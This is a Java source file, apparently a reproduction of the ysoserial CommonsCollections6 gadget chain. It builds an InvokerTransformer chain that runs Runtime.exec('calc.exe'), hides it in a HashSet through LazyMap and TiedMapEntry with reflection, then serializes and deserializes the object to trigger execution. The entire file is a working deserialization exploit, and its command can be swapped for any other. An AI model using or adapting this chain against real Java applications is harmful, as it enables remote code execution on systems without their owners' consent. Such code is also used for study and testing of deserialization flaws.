package CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class YsoCC6 {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),

                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),

                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new String[]{"calc.exe"}),

                new ConstantTransformer(1),
        };

        Transformer chain = new ChainedTransformer(transformers);

        HashMap innermap = new HashMap();
        LazyMap outermap = (LazyMap) LazyMap.decorate(innermap, chain);

        TiedMapEntry entrymap = new TiedMapEntry(outermap, 123);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");

        // 反射获取HashSet的map属性，以便后面对map的key的修改
        Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
        field.setAccessible(true);
        HashMap hashset_map = (HashMap) field.get(hashset);


        // 反射获取了HashMap中的table属性
        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[]) table.get(hashset_map);

        // 封装于Node对象中
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        // 获取到了table中的key之后，利用反射修改其为entrymap
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node, entrymap);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc6"));
        outputStream.writeObject(hashset);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc6"));
        inputStream.readObject();

    }
}
